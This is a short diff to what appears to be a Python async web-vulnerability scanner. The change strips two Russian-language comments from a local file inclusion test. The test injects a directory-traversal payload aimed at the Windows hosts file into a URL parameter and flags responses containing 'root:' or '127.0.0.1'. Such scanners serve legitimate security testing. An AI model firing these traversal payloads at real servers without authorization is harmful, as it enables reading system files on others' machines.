@@ -16,13 +16,13 @@ async def test_lfi(session, base_url, param):
         '../../../../../../../../../../../windows/system32/drivers/etc/hosts'
     ]
     for payload in lfi_payloads:
-        # Формируем URL правильно, заменяя значение параметра, а не добавляя новый параметр
+
         payloaded_url = f"{base_url.split('?')[0]}?{param}={payload}"
         logger.info(f"Testing LFI with URL: {payloaded_url}")
         try:
             response = await session.get(payloaded_url)
             response_text = await response.text()
-            logger.info(f"Response for {payloaded_url}: {response_text[:100]}")  # Логируем первые 100 символов ответа
+            logger.info(f"Response for {payloaded_url}: {response_text[:100]}")
             if 'root:' in response_text or '127.0.0.1' in response_text:
                 logger.info(f"LFI vulnerability found: {payloaded_url}")
                 return True, payloaded_url
